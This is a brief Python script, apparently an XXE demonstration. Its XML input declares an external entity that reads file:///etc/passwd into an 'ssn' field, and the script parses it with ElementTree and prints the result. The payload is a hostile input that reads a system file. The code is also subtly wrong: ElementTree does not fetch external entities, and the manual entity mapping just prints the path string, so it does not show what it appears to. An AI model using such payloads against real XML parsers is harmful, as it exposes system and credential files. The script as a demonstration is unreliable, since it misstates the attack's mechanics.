import xml.etree.ElementTree as ET

xml_data = """
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>John</name>
  <ssn>&xxe;</ssn>
</root>
"""

parser = ET.XMLParser()
parser.entity["xxe"] = "file:///etc/passwd"
root = ET.fromstring(xml_data, parser=parser)
print("Name:", root.find("name").text)
print("SSN:", root.find("ssn").text)
